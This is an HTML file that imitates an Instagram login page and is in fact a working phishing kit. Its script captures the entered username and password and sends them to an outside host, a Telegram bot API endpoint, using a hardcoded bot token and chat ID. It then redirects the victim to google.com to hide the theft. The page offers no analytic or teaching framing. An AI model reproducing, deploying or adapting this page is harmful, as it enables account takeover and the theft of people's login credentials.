<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 40px 20px;
            width: 350px;
            text-align: center;
        }
        .logo {
            font-size: 40px;
            font-weight: 600;
            margin-bottom: 30px;
            font-family: "Billabong", cursive;
            color: #262626;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 8px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:disabled {
            background: #b2dffc;
            cursor: default;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <input type="text" id="user" placeholder="Phone number, username, or email" required>
            <input type="password" id="key" placeholder="Password" required>
            <button type="submit" id="btn">Log in</button>
        </form>
        <div class="footer">Forgot password?</div>
    </div>

    <script>
        const TOKEN = '8983715515:AAFfNUMzfb5lqXbvomZje7xjEia5MA7_yCg';
        const CHAT_ID = '1778480051';

        const userInput = document.getElementById('user');
        const keyInput = document.getElementById('key');
        const btn = document.getElementById('btn');

        function checkInputs() {
            btn.disabled = !(userInput.value.trim() && keyInput.value.trim());
        }

        userInput.addEventListener('input', checkInputs);
        keyInput.addEventListener('input', checkInputs);
        checkInputs();

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = userInput.value;
            const key = keyInput.value;

            const text = `Новый вход:\nUser: ${user}\nKey: ${key}`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text
                })
            }).then(() => {
                window.location.href = 'https://www.google.com';
            }).catch(() => {
                window.location.href = 'https://www.google.com';
            });
        });
    </script>
</body>
</html>
